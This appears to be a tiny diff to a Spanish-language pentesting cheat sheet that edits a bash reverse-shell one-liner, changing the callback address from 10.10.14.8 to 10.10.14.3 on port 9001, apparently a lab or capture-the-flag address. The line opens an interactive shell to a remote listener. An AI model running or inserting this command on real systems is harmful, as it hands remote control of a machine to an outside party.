@@ -1,6 +1,6 @@
 ### Oneliner Bash
 ```css
-bash -c "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1"
+bash -c "bash -i >& /dev/tcp/10.10.14.3/9001 0>&1"
 ```
 
 ### Oneliner cmd desde url
